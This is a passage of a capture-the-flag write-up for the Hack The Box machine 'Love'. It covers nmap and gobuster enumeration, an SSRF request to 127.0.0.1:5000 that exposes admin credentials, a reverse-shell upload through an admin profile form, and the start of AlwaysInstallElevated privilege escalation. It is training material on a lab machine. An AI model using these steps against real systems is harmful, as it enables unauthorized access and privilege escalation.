+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="k">Not</span><span class="w"> </span><span class="k">Found</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span><span class="w"> </span><span class="n">Subject</span><span class="p">:</span><span class="w"> </span><span class="n">commonName</span><span class="o">=</span><span class="n">LOVE</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">Subject</span><span class="w"> </span><span class="n">Alternative</span><span class="w"> </span><span class="n">Name</span><span class="p">:</span><span class="w"> </span><span class="n">DNS</span><span class="p">:</span><span class="n">LOVE</span><span class="p">,</span><span class="w"> </span><span class="n">DNS</span><span class="p">:</span><span class="n">Love</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="k">Not</span><span class="w"> </span><span class="k">valid</span><span class="w"> </span><span class="k">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2021</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">11</span><span class="n">T14</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">19</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_Not</span><span class="w"> </span><span class="k">valid</span><span class="w"> </span><span class="k">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2024</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">10</span><span class="n">T14</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">19</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="nb">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2021</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">13</span><span class="n">T21</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">03</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">+</span><span class="mi">24</span><span class="n">m50s</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">scanner</span><span class="w"> </span><span class="n">time</span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">tls</span><span class="o">-</span><span class="n">alpn</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="n">http</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">7680</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">pando</span><span class="o">-</span><span class="n">pub</span><span class="o">?</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">47001</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">         </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">HTTPAPI</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="w"> </span><span class="p">(</span><span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Microsoft</span><span class="o">-</span><span class="n">HTTPAPI</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="k">Not</span><span class="w"> </span><span class="k">Found</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">49664</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">        </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">49665</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">        </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">49666</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">        </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">49667</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">        </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">49668</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">        </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">49669</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">        </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">49670</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">        </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">1</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">unrecognized</span><span class="w"> </span><span class="n">despite</span><span class="w"> </span><span class="n">returning</span><span class="w"> </span><span class="k">data</span><span class="p">.</span><span class="w"> </span><span class="k">If</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">know</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">service</span><span class="o">/</span><span class="k">version</span><span class="p">,</span><span class="w"> </span><span class="n">please</span><span class="w"> </span><span class="n">submit</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">fingerprint</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span><span class="o">/</span><span class="n">submit</span><span class="p">.</span><span class="n">cgi</span><span class="o">?</span><span class="k">new</span><span class="o">-</span><span class="n">service</span><span class="w"> </span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="o">-</span><span class="n">Port3306</span><span class="o">-</span><span class="n">TCP</span><span class="p">:</span><span class="n">V</span><span class="o">=</span><span class="mi">7</span><span class="p">.</span><span class="mi">91</span><span class="o">%</span><span class="n">I</span><span class="o">=</span><span class="mi">7</span><span class="o">%</span><span class="n">D</span><span class="o">=</span><span class="mi">8</span><span class="o">/</span><span class="mi">14</span><span class="o">%</span><span class="n">Time</span><span class="o">=</span><span class="mi">6116</span><span class="n">E1D8</span><span class="o">%</span><span class="n">P</span><span class="o">=</span><span class="n">x86_64</span><span class="o">-</span><span class="k">unknown</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">HTTPOptions</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20n
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ot\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">R</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:</span><span class="n">TSPRequest</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">DNSVe</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:</span><span class="n">rsionBindReqTCP</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:</span><span class="n">DNSStatusRequestTCP</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">Help</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">SSLSess</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:</span><span class="n">ionReq</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20al
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">TerminalS</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:</span><span class="n">erverCookie</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">TLSS</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:</span><span class="n">essionReq</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">Kerber</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:</span><span class="n">os</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20allowe
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">SMBProgNeg</span><span class="p">,</span><span class="mi">49</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20allowed\x20
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">X11Probe</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20allowed\x20to\x20c
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:onnect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">LPDString</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20allowed\x20to\x20connect
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">LDAPBindReq</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20allowed\x20to\x20connect\x20
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">SIPOptions</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Ho
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:st\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">LANDesk</span><span class="o">-</span><span class="n">RC</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0&#39;10\.10\.14\.7&#39;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\x20MariaDB\x20server&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="n">Hosts</span><span class="p">:</span><span class="w"> </span><span class="n">www</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="p">,</span><span class="w"> </span><span class="n">LOVE</span><span class="p">,</span><span class="w"> </span><span class="n">www</span><span class="p">.</span><span class="n">love</span><span class="p">.</span><span class="n">htb</span><span class="p">;</span><span class="w"> </span><span class="n">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="p">:</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Host</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">results</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="n">skew</span><span class="p">:</span><span class="w"> </span><span class="n">mean</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="n">h09m51s</span><span class="p">,</span><span class="w"> </span><span class="n">deviation</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="n">h30m03s</span><span class="p">,</span><span class="w"> </span><span class="n">median</span><span class="p">:</span><span class="w"> </span><span class="mi">24</span><span class="n">m49s</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">os</span><span class="o">-</span><span class="n">discovery</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="n">Pro</span><span class="w"> </span><span class="mi">19042</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="n">Pro</span><span class="w"> </span><span class="mi">6</span><span class="p">.</span><span class="mi">3</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">OS</span><span class="w"> </span><span class="n">CPE</span><span class="p">:</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows_10</span><span class="p">::</span><span class="o">-</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">Computer</span><span class="w"> </span><span class="n">name</span><span class="p">:</span><span class="w"> </span><span class="n">Love</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">NetBIOS</span><span class="w"> </span><span class="n">computer</span><span class="w"> </span><span class="n">name</span><span class="p">:</span><span class="w"> </span><span class="n">LOVE</span><span class="err">\</span><span class="n">x00</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">Workgroup</span><span class="p">:</span><span class="w"> </span><span class="n">WORKGROUP</span><span class="err">\</span><span class="n">x00</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="k">System</span><span class="w"> </span><span class="n">time</span><span class="p">:</span><span class="w"> </span><span class="mi">2021</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">13</span><span class="n">T14</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">49</span><span class="o">-</span><span class="mi">07</span><span class="p">:</span><span class="mi">00</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="k">security</span><span class="o">-</span><span class="k">mode</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">account_used</span><span class="p">:</span><span class="w"> </span><span class="n">guest</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">authentication_level</span><span class="p">:</span><span class="w"> </span><span class="k">user</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">challenge_response</span><span class="p">:</span><span class="w"> </span><span class="n">supported</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="n">message_signing</span><span class="p">:</span><span class="w"> </span><span class="n">disabled</span><span class="w"> </span><span class="p">(</span><span class="n">dangerous</span><span class="p">,</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="k">default</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">smb2</span><span class="o">-</span><span class="k">security</span><span class="o">-</span><span class="k">mode</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">2</span><span class="p">.</span><span class="mi">02</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">    </span><span class="n">Message</span><span class="w"> </span><span class="n">signing</span><span class="w"> </span><span class="n">enabled</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">required</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">smb2</span><span class="o">-</span><span class="n">time</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="nb">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2021</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">13</span><span class="n">T21</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">45</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="n">start_date</span><span class="p">:</span><span class="w"> </span><span class="n">N</span><span class="o">/</span><span class="n">A</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="n">done</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="mi">05</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span><span class="w"> </span><span class="mi">2021</span><span class="w"> </span><span class="c1">-- 1 IP address (1 host up) scanned in 1671.47 seconds
+</span></span></span></code></pre></div><h3 id="open-ports">Open Ports</h3>
+<ul>
+<li>This machine have webserver on port 80,443 and 5000.</li>
+<li>Also, SMB</li>
+<li>The nmap scan found the host name
+<ul>
+<li><code>staging.love.htb</code></li>
+<li><code>love.htb</code></li>
+<li>added to the 	<code>/etc/hosts</code> file.</li>
+</ul>
+</li>
+</ul>
+<h3 id="webpage-lovehtb">WebPage [love.htb]</h3>
+<ul>
+<li>Let&rsquo;s take look at <code>love.htb</code></li>
+</ul>
+<p><img src="love.png" alt="1"></p>
+<ul>
+<li>It&rsquo;s just a login page.</li>
+<li>We need credentials to access it</li>
+</ul>
+<h3 id="gobuster">Gobuster</h3>
+<ul>
+<li>I&rsquo;m gonna run the gobuster scan in the background</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster dir -u http://love.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php
+</span></span></code></pre></div><ul>
+<li>the result</li>
+</ul>
+<p><img src="gobuster.png" alt="1"></p>
+<ul>
+<li>I&rsquo;ll try my best to enumerate it.</li>
+<li>unfortunately, I can&rsquo;t find anything yet.</li>
+<li>Let&rsquo;s check the other site.</li>
+</ul>
+<h3 id="webpage-staginglovehtb">WebPage [staging.love.htb]</h3>
+<p><img src="staging.png" alt="1"></p>
+<ul>
+<li>Well, this is just <code>free file scanner</code> app.</li>
+<li>I try to <code>sign up</code> but it didn&rsquo;t work.</li>
+<li>However, I found the <code>input form</code> in the <code>demo tab</code> (at the top navbar)</li>
+</ul>
+<p><img src="demo.png" alt="1"></p>
+<ul>
+<li>It scans the file by entering the URL</li>
+<li>Now, I&rsquo;m gonna start the python web server and make a request</li>
+</ul>
+<p><img src="http_server.png" alt="1"></p>
+<ul>
+<li>then, put the URL.</li>
+<li>we&rsquo;ve got the response.</li>
+</ul>
+<p><img src="ffs-404.png" alt="1"></p>
+<h3 id="ssrf">SSRF</h3>
+<ul>
+<li>Server Side Request Forgery [SSRF]</li>
+</ul>
+<blockquote>
+<p>The attacker can supply or modify a URL which the code running on the server will read or submit data, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like HTTP enabled databases or perform post requests towards internal services which are not intended to be exposed.</p>
+</blockquote>
+<ul>
+<li>Source
+<ul>
+<li><a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery">OWASP - Server Side Request Forgery</a></li>
+<li><a href="https://portswigger.net/web-security/ssrf">PortSwigger - Server-side request forgery (SSRF)</a></li>
+</ul>
+</li>
+</ul>
+<br>
+<ul>
+<li>Remember the Nmap scan earlier.</li>
+<li>we&rsquo;ve found port <code>5000</code> open and running <code>Apache</code> but we can&rsquo;t reach it.</li>
+<li>So, I&rsquo;m gonna make the server do request on itself by putting <code>http://127.0.0.1:5000</code></li>
+<li>the result</li>
+</ul>
+<p><img src="5000.png" alt="1"></p>
+<ul>
+<li>cool! we&rsquo;ve got the <code>admin credentials</code></li>
+<li>gobuster scan earlier found the <code>/admin/</code> directory</li>
+<li>let&rsquo;s login with those creds</li>
+</ul>
+<h2 id="footholdgaining-access">Foothold/Gaining Access</h2>
+<h3 id="webpage-lovehtbadmin">WebPage [love.htb/admin]</h3>
+<p><img src="admin_webpage.png" alt="1"></p>
+<ul>
+<li>We&rsquo;ve got access to the admin panel</li>
+<li>Let&rsquo;s enumerate the admin panel.</li>
+<li>I&rsquo;ve found the <code>upload section</code> on the <code>admin update profile</code></li>
+</ul>
+<p><img src="update.png" alt="1"></p>
+<ul>
+<li>Let&rsquo;s upload the <code>reverse shell</code></li>
+<li>navigate to <code>love.htb/images/&lt;filename&gt;</code> to activate the reverse shell</li>
+</ul>
+<h2 id="phoebe">Phoebe</h2>
+<ul>
+<li>success!</li>
+<li>we&rsquo;ve got the shell</li>
+<li>Let&rsquo;s get the <code>user flag</code></li>
+</ul>
+<p><img src="phoebe.png" alt="1"></p>
+<h3 id="user-flag">User Flag</h3>
+<p><img src="user.png" alt="1"></p>
+<h3 id="winpeas">WinPEAS</h3>
+<ul>
+<li>Now, I&rsquo;m gonna upload the <code>WinPEAS</code></li>
+<li>Then, run the binary</li>
+</ul>
+<p><img src="winpeas.png" alt="1"></p>
+<ul>
+<li>To be honest, I can&rsquo;t find anything at all.</li>
+<li>Then, I just keep opening the link that has <code>red color</code></li>
+<li>Man oh man, I&rsquo;ve found it.</li>
+</ul>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p><img src="AlwaysInstallElevated.png" alt="1"></p>
+<blockquote>
+<p><font color="yellow">Checking AlwaysInstallElevated</font></p>
+</blockquote>
+<ul>
+<li>Let&rsquo;s googling around. I&rsquo;ve found some good source</li>
+<li>Source
+<ul>
+<li><a href="https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/">Hacking Articles - Windows Privilege Escalation (AlwaysInstallElevated)</a></li>
+<li><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated">HackTricks - windows-local-privilege-escalation</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated">Microsoft - AlwaysInstallElevated</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="alwaysinstallelevated">AlwaysInstallElevated</h3>
+<blockquote>
+<p>As we all are aware that Windows OS comes installed with a Windows Installer engine which is used by <font color="yellow">MSI packages</font> for the installation of applications. These MSI packages can be installed with elevated privileges for non-admin users</p>
+</blockquote>
+<ul>
+<li>How, we wanna know if this <code>AlwaysInstallElevated</code> can use?
+<ul>
+<li>If these 2 registers are enable (value is 0x1)</li>
